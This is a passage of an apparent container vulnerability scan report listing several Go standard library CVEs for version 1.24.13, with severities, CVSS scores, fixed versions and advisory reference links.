│     │      │                  ├ [16] : https://access.redhat.com/errata/RHSA-2026:16101 
│     │      │                  ├ [17] : https://access.redhat.com/errata/RHSA-2026:16102 
│     │      │                  ├ [18] : https://access.redhat.com/errata/RHSA-2026:16875 
│     │      │                  ├ [19] : https://access.redhat.com/errata/RHSA-2026:17075 
│     │      │                  ├ [20] : https://access.redhat.com/errata/RHSA-2026:17084 
│     │      │                  ├ [21] : https://access.redhat.com/errata/RHSA-2026:17287 
│     │      │                  ├ [22] : https://access.redhat.com/errata/RHSA-2026:18027 
│     │      │                  ├ [23] : https://access.redhat.com/errata/RHSA-2026:18032 
│     │      │                  ├ [24] : https://access.redhat.com/errata/RHSA-2026:19126 
│     │      │                  ├ [25] : https://access.redhat.com/errata/RHSA-2026:19132 
│     │      │                  ├ [26] : https://access.redhat.com/errata/RHSA-2026:19133 
│     │      │                  ├ [27] : https://access.redhat.com/errata/RHSA-2026:19134 
│     │      │                  ├ [28] : https://access.redhat.com/errata/RHSA-2026:19135 
│     │      │                  ├ [29] : https://access.redhat.com/errata/RHSA-2026:19136 
│     │      │                  ├ [30] : https://access.redhat.com/errata/RHSA-2026:19137 
│     │      │                  ├ [31] : https://access.redhat.com/errata/RHSA-2026:19139 
│     │      │                  ├ [32] : https://access.redhat.com/errata/RHSA-2026:19144 
│     │      │                  ├ [33] : https://access.redhat.com/errata/RHSA-2026:19156 
│     │      │                  ├ [34] : https://access.redhat.com/errata/RHSA-2026:19350 
│     │      │                  ├ [35] : https://access.redhat.com/errata/RHSA-2026:19351 
│     │      │                  ├ [36] : https://access.redhat.com/errata/RHSA-2026:19352 
│     │      │                  ├ [37] : https://access.redhat.com/errata/RHSA-2026:19353 
│     │      │                  ├ [38] : https://access.redhat.com/errata/RHSA-2026:19369 
│     │      │                  ├ [39] : https://access.redhat.com/errata/RHSA-2026:19450 
│     │      │                  ├ [40] : https://access.redhat.com/errata/RHSA-2026:19550 
│     │      │                  ├ [41] : https://access.redhat.com/errata/RHSA-2026:19634 
│     │      │                  ├ [42] : https://access.redhat.com/errata/RHSA-2026:19714 
│     │      │                  ├ [43] : https://access.redhat.com/errata/RHSA-2026:19715 
│     │      │                  ├ [44] : https://access.redhat.com/errata/RHSA-2026:19719 
│     │      │                  ├ [45] : https://access.redhat.com/errata/RHSA-2026:19720 
│     │      │                  ├ [46] : https://access.redhat.com/errata/RHSA-2026:19721 
│     │      │                  ├ [47] : https://access.redhat.com/errata/RHSA-2026:19722 
│     │      │                  ├ [48] : https://access.redhat.com/errata/RHSA-2026:19750 
│     │      │                  ├ [49] : https://access.redhat.com/errata/RHSA-2026:19839 
│     │      │                  ├ [50] : https://access.redhat.com/errata/RHSA-2026:20556 
│     │      │                  ├ [51] : https://access.redhat.com/errata/RHSA-2026:20569 
│     │      │                  ├ [52] : https://access.redhat.com/errata/RHSA-2026:20570 
│     │      │                  ├ [53] : https://access.redhat.com/errata/RHSA-2026:20571 
│     │      │                  ├ [54] : https://access.redhat.com/errata/RHSA-2026:20607 
│     │      │                  ├ [55] : https://access.redhat.com/errata/RHSA-2026:20608 
│     │      │                  ├ [56] : https://access.redhat.com/errata/RHSA-2026:20609 
│     │      │                  ├ [57] : https://access.redhat.com/errata/RHSA-2026:21769 
│     │      │                  ├ [58] : https://access.redhat.com/errata/RHSA-2026:22347 
│     │      │                  ├ [59] : https://access.redhat.com/errata/RHSA-2026:22423 
│     │      │                  ├ [60] : https://access.redhat.com/errata/RHSA-2026:22450 
│     │      │                  ├ [61] : https://access.redhat.com/errata/RHSA-2026:22485 
│     │      │                  ├ [62] : https://access.redhat.com/errata/RHSA-2026:22709 
│     │      │                  ├ [63] : https://access.redhat.com/errata/RHSA-2026:22713 
│     │      │                  ├ [64] : https://access.redhat.com/errata/RHSA-2026:22714 
│     │      │                  ├ [65] : https://access.redhat.com/errata/RHSA-2026:22937 
│     │      │                  ├ [66] : https://access.redhat.com/errata/RHSA-2026:23102 
│     │      │                  ├ [67] : https://access.redhat.com/errata/RHSA-2026:23103 
│     │      │                  ├ [68] : https://access.redhat.com/errata/RHSA-2026:23228 
│     │      │                  ├ [69] : https://access.redhat.com/errata/RHSA-2026:23345 
│     │      │                  ├ [70] : https://access.redhat.com/errata/RHSA-2026:24337 
│     │      │                  ├ [71] : https://access.redhat.com/errata/RHSA-2026:24470 
│     │      │                  ├ [72] : https://access.redhat.com/errata/RHSA-2026:24761 
│     │      │                  ├ [73] : https://access.redhat.com/errata/RHSA-2026:24762 
│     │      │                  ├ [74] : https://access.redhat.com/errata/RHSA-2026:26447 
│     │      │                  ├ [75] : https://access.redhat.com/errata/RHSA-2026:26571 
│     │      │                  ├ [76] : https://access.redhat.com/errata/RHSA-2026:26636 
│     │      │                  ├ [77] : https://access.redhat.com/errata/RHSA-2026:27076 
│     │      │                  ├ [78] : https://access.redhat.com/errata/RHSA-2026:28038 
│     │      │                  ├ [79] : https://access.redhat.com/errata/RHSA-2026:28047 
│     │      │                  ├ [80] : https://access.redhat.com/errata/RHSA-2026:28074 
│     │      │                  ├ [81] : https://access.redhat.com/errata/RHSA-2026:29035 
│     │      │                  ├ [82] : https://access.redhat.com/errata/RHSA-2026:29195 
│     │      │                  ├ [83] : https://access.redhat.com/errata/RHSA-2026:29455 
│     │      │                  ├ [84] : https://access.redhat.com/errata/RHSA-2026:29703 
│     │      │                  ├ [85] : https://access.redhat.com/errata/RHSA-2026:33722 
│     │      │                  ├ [86] : https://access.redhat.com/errata/RHSA-2026:34192 
│     │      │                  ├ [87] : https://access.redhat.com/errata/RHSA-2026:34196 
│     │      │                  ├ [88] : https://access.redhat.com/errata/RHSA-2026:34197 
│     │      │                  ├ [89] : https://access.redhat.com/errata/RHSA-2026:34365 
│     │      │                  ├ [90] : https://access.redhat.com/errata/RHSA-2026:36796 
│     │      │                  ├ [91] : https://access.redhat.com/errata/RHSA-2026:39810 
│     │      │                  ├ [92] : https://access.redhat.com/errata/RHSA-2026:41019 
│     │      │                  ├ [93] : https://access.redhat.com/errata/RHSA-2026:41928 
│     │      │                  ├ [94] : https://access.redhat.com/errata/RHSA-2026:42644 
│     │      │                  ├ [95] : https://access.redhat.com/errata/RHSA-2026:7291 
│     │      │                  ├ [96] : https://access.redhat.com/errata/RHSA-2026:7385 
│     │      │                  ├ [97] : https://access.redhat.com/security/cve/CVE-2026-32283 
│     │      │                  ├ [98] : https://bugzilla.redhat.com/2445356 
│     │      │                  ├ [99] : https://bugzilla.redhat.com/2456333 
│     │      │                  ├ [100]: https://bugzilla.redhat.com/2456338 
│     │      │                  ├ [101]: https://bugzilla.redhat.com/2456339 
│     │      │                  ├ [102]: https://bugzilla.redhat.com/show_bug.cgi?id=2445356 
│     │      │                  ├ [103]: https://bugzilla.redhat.com/show_bug.cgi?id=2455470 
│     │      │                  ├ [104]: https://bugzilla.redhat.com/show_bug.cgi?id=2456333 
│     │      │                  ├ [105]: https://bugzilla.redhat.com/show_bug.cgi?id=2456338 
│     │      │                  ├ [106]: https://bugzilla.redhat.com/show_bug.cgi?id=2456339 
│     │      │                  ├ [107]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-25679 
│     │      │                  ├ [108]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-32280 
│     │      │                  ├ [109]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-32281 
│     │      │                  ├ [110]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-32283 
│     │      │                  ├ [111]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-34986 
│     │      │                  ├ [112]: https://errata.almalinux.org/9/ALSA-2026-29703.html 
│     │      │                  ├ [113]: https://errata.rockylinux.org/RLSA-2026:33722 
│     │      │                  ├ [114]: https://go.dev/cl/763767 
│     │      │                  ├ [115]: https://go.dev/issue/78334 
│     │      │                  ├ [116]: https://groups.google.com/g/golang-announce/c/0uYbvbPZRWU 
│     │      │                  ├ [117]: https://linux.oracle.com/cve/CVE-2026-32283.html 
│     │      │                  ├ [118]: https://linux.oracle.com/errata/ELSA-2026-33722.html 
│     │      │                  ├ [119]: https://nvd.nist.gov/vuln/detail/CVE-2026-32283 
│     │      │                  ├ [120]: https://pkg.go.dev/vuln/GO-2026-4870 
│     │      │                  ├ [121]: https://security.access.redhat.com/data/csaf/v2/vex/2026/cve-2026-3228
│     │      │                  │        3.json 
│     │      │                  ╰ [122]: https://www.cve.org/CVERecord?id=CVE-2026-32283 
│     │      ├ PublishedDate   : 2026-04-08T02:16:03.58Z 
│     │      ╰ LastModifiedDate: 2026-07-27T13:17:26.853Z 
│     ├ [26] ╭ VulnerabilityID : CVE-2026-33811 
│     │      ├ VendorIDs        ─ [0]: GO-2026-4981 
│     │      ├ PkgID           : stdlib@v1.24.13 
│     │      ├ PkgName         : stdlib 
│     │      ├ PkgIdentifier    ╭ PURL: pkg:golang/stdlib@v1.24.13 
│     │      │                  ╰ UID : ae746daa41f315ef 
│     │      ├ InstalledVersion: v1.24.13 
│     │      ├ FixedVersion    : 1.25.10, 1.26.3 
│     │      ├ Status          : fixed 
│     │      ├ Layer            ╭ Digest: sha256:42eba42eb1a81e5596620500b84a1f8aa005a623274431b41b4358ddc7f17a7e 
│     │      │                  ╰ DiffID: sha256:276dd070507261040bccf490fe9d3f9cbf1ca33027a34f6ed6abfbb61f3e271a 
│     │      ├ SeveritySource  : nvd 
│     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-33811 
│     │      ├ DataSource       ╭ ID  : govulndb 
│     │      │                  ├ Name: The Go Vulnerability Database 
│     │      │                  ╰ URL : https://pkg.go.dev/vuln/ 
│     │      ├ Fingerprint     : sha256:3e973b282cb15f204b02e789ddc0f9117e5faaf0c5bcd1d12cb962eb18723dc5 
│     │      ├ Title           : net: golang: Go net package: Denial of Service via long CNAME response in
│     │      │                   LookupCNAME 
│     │      ├ Description     : When using LookupCNAME with the cgo DNS resolver, a very long CNAME response
│     │      │                   can trigger a double-free of C memory and a crash. 
│     │      ├ Severity        : HIGH 
│     │      ├ CweIDs           ╭ [0]: CWE-415 
│     │      │                  ╰ [1]: CWE-1341 
│     │      ├ VendorSeverity   ╭ alma       : 3 
│     │      │                  ├ amazon     : 3 
│     │      │                  ├ bitnami    : 3 
│     │      │                  ├ nvd        : 3 
│     │      │                  ├ oracle-oval: 3 
│     │      │                  ├ photon     : 3 
│     │      │                  ├ redhat     : 3 
│     │      │                  ╰ rocky      : 3 
│     │      ├ CVSS             ╭ bitnami ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H 
│     │      │                  │         ╰ V3Score : 7.5 
│     │      │                  ├ nvd     ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H 
│     │      │                  │         ╰ V3Score : 7.5 
│     │      │                  ╰ redhat  ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H 
│     │      │                            ╰ V3Score : 7.5 
│     │      ├ References       ╭ [0] : https://access.redhat.com/errata/RHSA-2026:23262 
│     │      │                  ├ [1] : https://access.redhat.com/errata/RHSA-2026:23264 
│     │      │                  ├ [2] : https://access.redhat.com/errata/RHSA-2026:33120 
│     │      │                  ├ [3] : https://access.redhat.com/errata/RHSA-2026:33123 
│     │      │                  ├ [4] : https://access.redhat.com/errata/RHSA-2026:33142 
│     │      │                  ├ [5] : https://access.redhat.com/errata/RHSA-2026:33150 
│     │      │                  ├ [6] : https://access.redhat.com/errata/RHSA-2026:33574 
│     │      │                  ├ [7] : https://access.redhat.com/errata/RHSA-2026:34357 
│     │      │                  ├ [8] : https://access.redhat.com/errata/RHSA-2026:34359 
│     │      │                  ├ [9] : https://access.redhat.com/errata/RHSA-2026:34364 
│     │      │                  ├ [10]: https://access.redhat.com/errata/RHSA-2026:35832 
│     │      │                  ├ [11]: https://access.redhat.com/errata/RHSA-2026:35993 
│     │      │                  ├ [12]: https://access.redhat.com/errata/RHSA-2026:35994 
│     │      │                  ├ [13]: https://access.redhat.com/errata/RHSA-2026:35995 
│     │      │                  ├ [14]: https://access.redhat.com/errata/RHSA-2026:36207 
│     │      │                  ├ [15]: https://access.redhat.com/errata/RHSA-2026:36319 
│     │      │                  ├ [16]: https://access.redhat.com/errata/RHSA-2026:36617 
│     │      │                  ├ [17]: https://access.redhat.com/errata/RHSA-2026:36625 
│     │      │                  ├ [18]: https://access.redhat.com/errata/RHSA-2026:36648 
│     │      │                  ├ [19]: https://access.redhat.com/errata/RHSA-2026:36651 
│     │      │                  ├ [20]: https://access.redhat.com/errata/RHSA-2026:36776 
│     │      │                  ├ [21]: https://access.redhat.com/errata/RHSA-2026:36796 
│     │      │                  ├ [22]: https://access.redhat.com/errata/RHSA-2026:36797 
│     │      │                  ├ [23]: https://access.redhat.com/errata/RHSA-2026:38504 
│     │      │                  ├ [24]: https://access.redhat.com/errata/RHSA-2026:39266 
│     │      │                  ├ [25]: https://access.redhat.com/errata/RHSA-2026:39272 
│     │      │                  ├ [26]: https://access.redhat.com/errata/RHSA-2026:39319 
│     │      │                  ├ [27]: https://access.redhat.com/errata/RHSA-2026:39573 
│     │      │                  ├ [28]: https://access.redhat.com/errata/RHSA-2026:39810 
│     │      │                  ├ [29]: https://access.redhat.com/errata/RHSA-2026:40118 
│     │      │                  ├ [30]: https://access.redhat.com/errata/RHSA-2026:40119 
│     │      │                  ├ [31]: https://access.redhat.com/errata/RHSA-2026:40945 
│     │      │                  ├ [32]: https://access.redhat.com/errata/RHSA-2026:41019 
│     │      │                  ├ [33]: https://access.redhat.com/errata/RHSA-2026:41030 
│     │      │                  ├ [34]: https://access.redhat.com/errata/RHSA-2026:41055 
│     │      │                  ├ [35]: https://access.redhat.com/errata/RHSA-2026:41928 
│     │      │                  ├ [36]: https://access.redhat.com/errata/RHSA-2026:42043 
│     │      │                  ├ [37]: https://access.redhat.com/errata/RHSA-2026:42047 
│     │      │                  ├ [38]: https://access.redhat.com/errata/RHSA-2026:42048 
│     │      │                  ├ [39]: https://access.redhat.com/errata/RHSA-2026:42049 
│     │      │                  ├ [40]: https://access.redhat.com/errata/RHSA-2026:42050 
│     │      │                  ├ [41]: https://access.redhat.com/errata/RHSA-2026:42051 
│     │      │                  ├ [42]: https://access.redhat.com/errata/RHSA-2026:42078 
│     │      │                  ├ [43]: https://access.redhat.com/errata/RHSA-2026:42079 
│     │      │                  ├ [44]: https://access.redhat.com/errata/RHSA-2026:42082 
│     │      │                  ├ [45]: https://access.redhat.com/errata/RHSA-2026:42132 
│     │      │                  ├ [46]: https://access.redhat.com/errata/RHSA-2026:42150 
│     │      │                  ├ [47]: https://access.redhat.com/errata/RHSA-2026:42151 
│     │      │                  ├ [48]: https://access.redhat.com/errata/RHSA-2026:42240 
│     │      │                  ├ [49]: https://access.redhat.com/errata/RHSA-2026:42644 
│     │      │                  ├ [50]: https://access.redhat.com/errata/RHSA-2026:42852 
│     │      │                  ├ [51]: https://access.redhat.com/errata/RHSA-2026:42946 
│     │      │                  ├ [52]: https://access.redhat.com/errata/RHSA-2026:43038 
│     │      │                  ├ [53]: https://access.redhat.com/errata/RHSA-2026:43692 
│     │      │                  ├ [54]: https://access.redhat.com/errata/RHSA-2026:44622 
│     │      │                  ├ [55]: https://access.redhat.com/security/cve/CVE-2026-33811 
│     │      │                  ├ [56]: https://bugzilla.redhat.com/2467822 
│     │      │                  ├ [57]: https://bugzilla.redhat.com/show_bug.cgi?id=2467822 
│     │      │                  ├ [58]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-33811 
│     │      │                  ├ [59]: https://errata.almalinux.org/9/ALSA-2026-39319.html 
│     │      │                  ├ [60]: https://errata.rockylinux.org/RLSA-2026:39266 
│     │      │                  ├ [61]: https://go.dev/cl/767860 
│     │      │                  ├ [62]: https://go.dev/issue/78803 
│     │      │                  ├ [63]: https://groups.google.com/g/golang-announce/c/qcCIEXso47M 
│     │      │                  ├ [64]: https://linux.oracle.com/cve/CVE-2026-33811.html 
│     │      │                  ├ [65]: https://linux.oracle.com/errata/ELSA-2026-39573.html 
│     │      │                  ├ [66]: https://nvd.nist.gov/vuln/detail/CVE-2026-33811 
│     │      │                  ├ [67]: https://pkg.go.dev/vuln/GO-2026-4981 
│     │      │                  ├ [68]: https://security.access.redhat.com/data/csaf/v2/vex/2026/cve-2026-33811
│     │      │                  │       .json 
│     │      │                  ╰ [69]: https://www.cve.org/CVERecord?id=CVE-2026-33811 
│     │      ├ PublishedDate   : 2026-05-07T20:16:42.77Z 
│     │      ╰ LastModifiedDate: 2026-07-27T13:17:37.837Z 
│     ├ [27] ╭ VulnerabilityID : CVE-2026-33814 
│     │      ├ VendorIDs        ─ [0]: GO-2026-4918 
│     │      ├ PkgID           : stdlib@v1.24.13 
│     │      ├ PkgName         : stdlib 
│     │      ├ PkgIdentifier    ╭ PURL: pkg:golang/stdlib@v1.24.13 
│     │      │                  ╰ UID : ae746daa41f315ef 
│     │      ├ InstalledVersion: v1.24.13 
│     │      ├ FixedVersion    : 1.25.10, 1.26.3 
│     │      ├ Status          : fixed 
│     │      ├ Layer            ╭ Digest: sha256:42eba42eb1a81e5596620500b84a1f8aa005a623274431b41b4358ddc7f17a7e 
│     │      │                  ╰ DiffID: sha256:276dd070507261040bccf490fe9d3f9cbf1ca33027a34f6ed6abfbb61f3e271a 
│     │      ├ SeveritySource  : nvd 
│     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-33814 
│     │      ├ DataSource       ╭ ID  : govulndb 
│     │      │                  ├ Name: The Go Vulnerability Database 
│     │      │                  ╰ URL : https://pkg.go.dev/vuln/ 
│     │      ├ Fingerprint     : sha256:5864f19f223914932c33e715ea55f67eb7a5e4d7246d68270dd8bc2c2a9607ae 
│     │      ├ Title           : net/http/internal/http2: golang: golang.org/x/net: Go HTTP/2: Denial of
│     │      │                   Service via malformed SETTINGS_MAX_FRAME_SIZE frame 
│     │      ├ Description     : When processing HTTP/2 SETTINGS frames, transport will enter an infinite loop
│     │      │                   of writing CONTINUATION frames if it receives a SETTINGS_MAX_FRAME_SIZE with a
│     │      │                    value of 0. 
│     │      ├ Severity        : HIGH 
│     │      ├ CweIDs           ╭ [0]: CWE-835 
│     │      │                  ╰ [1]: CWE-606 
│     │      ├ VendorSeverity   ╭ amazon     : 3 
│     │      │                  ├ azure      : 2 
│     │      │                  ├ bitnami    : 3 
│     │      │                  ├ nvd        : 3 
│     │      │                  ├ oracle-oval: 3 
│     │      │                  ├ photon     : 3 
│     │      │                  ├ redhat     : 3 
│     │      │                  ╰ ubuntu     : 2 
│     │      ├ CVSS             ╭ bitnami ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H 
│     │      │                  │         ╰ V3Score : 7.5 
│     │      │                  ├ nvd     ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H 
│     │      │                  │         ╰ V3Score : 7.5 
│     │      │                  ╰ redhat  ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H 
│     │      │                            ╰ V3Score : 7.5 
│     │      ├ References       ╭ [0] : https://access.redhat.com/errata/RHSA-2026:23262 
│     │      │                  ├ [1] : https://access.redhat.com/errata/RHSA-2026:23264 
│     │      │                  ├ [2] : https://access.redhat.com/errata/RHSA-2026:33120 
│     │      │                  ├ [3] : https://access.redhat.com/errata/RHSA-2026:33123 
│     │      │                  ├ [4] : https://access.redhat.com/errata/RHSA-2026:33142 
│     │      │                  ├ [5] : https://access.redhat.com/errata/RHSA-2026:33150 
│     │      │                  ├ [6] : https://access.redhat.com/errata/RHSA-2026:34342 
│     │      │                  ├ [7] : https://access.redhat.com/errata/RHSA-2026:37387 
│     │      │                  ├ [8] : https://access.redhat.com/errata/RHSA-2026:42644 
│     │      │                  ├ [9] : https://access.redhat.com/errata/RHSA-2026:43692 
│     │      │                  ├ [10]: https://access.redhat.com/security/cve/CVE-2026-33814 
│     │      │                  ├ [11]: https://bugzilla.redhat.com/show_bug.cgi?id=2467815 
│     │      │                  ├ [12]: https://github.com/golang/go/issues/78476 
│     │      │                  ├ [13]: https://go-review.googlesource.com/c/go/+/761581 
│     │      │                  ├ [14]: https://go-review.googlesource.com/c/net/+/761640 
│     │      │                  ├ [15]: https://go.dev/cl/761581 
│     │      │                  ├ [16]: https://go.dev/cl/761640 
│     │      │                  ├ [17]: https://go.dev/issue/78476 
│     │      │                  ├ [18]: https://groups.google.com/g/golang-announce/c/qcCIEXso47M 
│     │      │                  ├ [19]: https://linux.oracle.com/cve/CVE-2026-33814.html 
│     │      │                  ├ [20]: https://linux.oracle.com/errata/ELSA-2026-22121.html 
│     │      │                  ├ [21]: https://nvd.nist.gov/vuln/detail/CVE-2026-33814 
│     │      │                  ├ [22]: https://pkg.go.dev/vuln/GO-2026-4918 
│     │      │                  ├ [23]: https://security.access.redhat.com/data/csaf/v2/vex/2026/cve-2026-33814
│     │      │                  │       .json 
│     │      │                  ├ [24]: https://ubuntu.com/security/notices/USN-8430-1 
│     │      │                  ├ [25]: https://ubuntu.com/security/notices/USN-8471-1 
│     │      │                  ├ [26]: https://ubuntu.com/security/notices/USN-8472-1 
│     │      │                  ├ [27]: https://ubuntu.com/security/notices/USN-8473-1 
│     │      │                  ╰ [28]: https://www.cve.org/CVERecord?id=CVE-2026-33814 
│     │      ├ PublishedDate   : 2026-05-07T20:16:42.88Z 
│     │      ╰ LastModifiedDate: 2026-07-24T13:18:01.21Z 
│     ├ [28] ╭ VulnerabilityID : CVE-2026-39820 
│     │      ├ VendorIDs        ─ [0]: GO-2026-4986 
│     │      ├ PkgID           : stdlib@v1.24.13 
│     │      ├ PkgName         : stdlib 
│     │      ├ PkgIdentifier    ╭ PURL: pkg:golang/stdlib@v1.24.13 
│     │      │                  ╰ UID : ae746daa41f315ef 
│     │      ├ InstalledVersion: v1.24.13 
│     │      ├ FixedVersion    : 1.25.10, 1.26.3 
│     │      ├ Status          : fixed 
│     │      ├ Layer            ╭ Digest: sha256:42eba42eb1a81e5596620500b84a1f8aa005a623274431b41b4358ddc7f17a7e 
│     │      │                  ╰ DiffID: sha256:276dd070507261040bccf490fe9d3f9cbf1ca33027a34f6ed6abfbb61f3e271a 
│     │      ├ SeveritySource  : nvd 
│     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-39820 
│     │      ├ DataSource       ╭ ID  : govulndb 
│     │      │                  ├ Name: The Go Vulnerability Database 
│     │      │                  ╰ URL : https://pkg.go.dev/vuln/ 
│     │      ├ Fingerprint     : sha256:9a9f40b2a6b8b94f9681469bdf90814da620e06debed47db070760a6f39804a0 
│     │      ├ Title           : net/mail: golang: Go net/mail: Denial of Service via crafted email inputs 
│     │      ├ Description     : Well-crafted inputs reaching ParseAddress, ParseAddressList, and ParseDate
│     │      │                   were able to trigger excessive CPU exhaustion and memory allocations. 
│     │      ├ Severity        : HIGH 
│     │      ├ CweIDs           ╭ [0]: CWE-770 
│     │      │                  ╰ [1]: CWE-606 
│     │      ├ VendorSeverity   ╭ amazon     : 3 
│     │      │                  ├ bitnami    : 3 
│     │      │                  ├ nvd        : 3 
│     │      │                  ├ oracle-oval: 3 
│     │      │                  ├ photon     : 3 
│     │      │                  ╰ redhat     : 3 
│     │      ├ CVSS             ╭ bitnami ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H 
│     │      │                  │         ╰ V3Score : 7.5 
│     │      │                  ├ nvd     ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H 
│     │      │                  │         ╰ V3Score : 7.5 
│     │      │                  ╰ redhat  ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H 
│     │      │                            ╰ V3Score : 7.5 
│     │      ├ References       ╭ [0] : https://access.redhat.com/errata/RHSA-2026:23262 
│     │      │                  ├ [1] : https://access.redhat.com/errata/RHSA-2026:23264 
│     │      │                  ├ [2] : https://access.redhat.com/errata/RHSA-2026:33120 
│     │      │                  ├ [3] : https://access.redhat.com/errata/RHSA-2026:33123 
│     │      │                  ├ [4] : https://access.redhat.com/errata/RHSA-2026:33142 
│     │      │                  ├ [5] : https://access.redhat.com/errata/RHSA-2026:33150 
│     │      │                  ├ [6] : https://access.redhat.com/errata/RHSA-2026:33574 
│     │      │                  ├ [7] : https://access.redhat.com/errata/RHSA-2026:34364 
│     │      │                  ├ [8] : https://access.redhat.com/errata/RHSA-2026:36319 
│     │      │                  ├ [9] : https://access.redhat.com/errata/RHSA-2026:36625 
│     │      │                  ├ [10]: https://access.redhat.com/errata/RHSA-2026:36754 
│     │      │                  ├ [11]: https://access.redhat.com/errata/RHSA-2026:36797 
│     │      │                  ├ [12]: https://access.redhat.com/errata/RHSA-2026:40262 
│     │      │                  ├ [13]: https://access.redhat.com/errata/RHSA-2026:41031 
│     │      │                  ├ [14]: https://access.redhat.com/errata/RHSA-2026:41066 
│     │      │                  ├ [15]: https://access.redhat.com/errata/RHSA-2026:41928 
│     │      │                  ├ [16]: https://access.redhat.com/errata/RHSA-2026:42146 
│     │      │                  ├ [17]: https://access.redhat.com/errata/RHSA-2026:42644 
│     │      │                  ├ [18]: https://access.redhat.com/errata/RHSA-2026:42796 
│     │      │                  ├ [19]: https://access.redhat.com/errata/RHSA-2026:43038 
│     │      │                  ├ [20]: https://access.redhat.com/errata/RHSA-2026:43052 
│     │      │                  ├ [21]: https://access.redhat.com/errata/RHSA-2026:43692 
│     │      │                  ├ [22]: https://access.redhat.com/security/cve/CVE-2026-39820 
│     │      │                  ├ [23]: https://bugzilla.redhat.com/show_bug.cgi?id=2467820 
│     │      │                  ├ [24]: https://go.dev/cl/759940 
│     │      │                  ├ [25]: https://go.dev/issue/78566 
│     │      │                  ├ [26]: https://groups.google.com/g/golang-announce/c/qcCIEXso47M 
│     │      │                  ├ [27]: https://linux.oracle.com/cve/CVE-2026-39820.html 
│     │      │                  ├ [28]: https://linux.oracle.com/errata/ELSA-2026-22121.html 
│     │      │                  ├ [29]: https://nvd.nist.gov/vuln/detail/CVE-2026-39820 
│     │      │                  ├ [30]: https://pkg.go.dev/vuln/GO-2026-4986 
│     │      │                  ├ [31]: https://security.access.redhat.com/data/csaf/v2/vex/2026/cve-2026-39820
│     │      │                  │       .json 
│     │      │                  ╰ [32]: https://www.cve.org/CVERecord?id=CVE-2026-39820 
│     │      ├ PublishedDate   : 2026-05-07T20:16:43.187Z 
│     │      ╰ LastModifiedDate: 2026-07-27T13:17:45.447Z 
│     ├ [29] ╭ VulnerabilityID : CVE-2026-39822 
│     │      ├ VendorIDs        ─ [0]: GO-2026-4970 
│     │      ├ PkgID           : stdlib@v1.24.13 
│     │      ├ PkgName         : stdlib 
│     │      ├ PkgIdentifier    ╭ PURL: pkg:golang/stdlib@v1.24.13 
│     │      │                  ╰ UID : ae746daa41f315ef 
│     │      ├ InstalledVersion: v1.24.13 
│     │      ├ FixedVersion    : 1.25.12, 1.26.5, 1.27.0-rc.2 
│     │      ├ Status          : fixed 
│     │      ├ Layer            ╭ Digest: sha256:42eba42eb1a81e5596620500b84a1f8aa005a623274431b41b4358ddc7f17a7e 
│     │      │                  ╰ DiffID: sha256:276dd070507261040bccf490fe9d3f9cbf1ca33027a34f6ed6abfbb61f3e271a 
│     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-39822 
│     │      ├ DataSource       ╭ ID  : govulndb 
│     │      │                  ├ Name: The Go Vulnerability Database 
│     │      │                  ╰ URL : https://pkg.go.dev/vuln/ 
│     │      ├ Fingerprint     : sha256:85390a7640739a69b4264890526f499b2339bcc2a03fde19e77350fc907ff85b 
│     │      ├ Title           : os: golang: Go os.Root: Symlink following vulnerability allows directory
│     │      │                   traversal 
│     │      ├ Description     : On Unix systems, opening a file in an os.Root improperly follows symlinks to
│     │      │                   locations outside of the Root when the final path component of the a path is a
│     │      │                    symbolic link and the path ends in /. For example, 'root.Open("symlink/")'
│     │      │                   will open "symlink" even when "symlink" is a symbolic link pointing outside of
│     │      │                    the root. 
│     │      ├ Severity        : HIGH 
│     │      ├ CweIDs           ─ [0]: CWE-61 
│     │      ├ VendorSeverity   ╭ alma       : 3 
│     │      │                  ├ amazon     : 2 
│     │      │                  ├ bitnami    : 3 
│     │      │                  ├ oracle-oval: 3 
│     │      │                  ├ redhat     : 3 
│     │      │                  ╰ rocky      : 3 
│     │      ├ CVSS             ╭ bitnami ╭ V3Vector: CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H 
│     │      │                  │         ╰ V3Score : 7.8 
│     │      │                  ╰ redhat  ╭ V3Vector: CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H 
│     │      │                            ╰ V3Score : 7.8 
│     │      ├ References       ╭ [0] : https://access.redhat.com/errata/RHSA-2026:38878 
│     │      │                  ├ [1] : https://access.redhat.com/security/cve/CVE-2026-39822 
│     │      │                  ├ [2] : https://bugzilla.redhat.com/2498152 
│     │      │                  ├ [3] : https://bugzilla.redhat.com/show_bug.cgi?id=2480756 
│     │      │                  ├ [4] : https://bugzilla.redhat.com/show_bug.cgi?id=2484207 
│     │      │                  ├ [5] : https://bugzilla.redhat.com/show_bug.cgi?id=2498152 
│     │      │                  ├ [6] : https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-27145 
│     │      │                  ├ [7] : https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-39821 
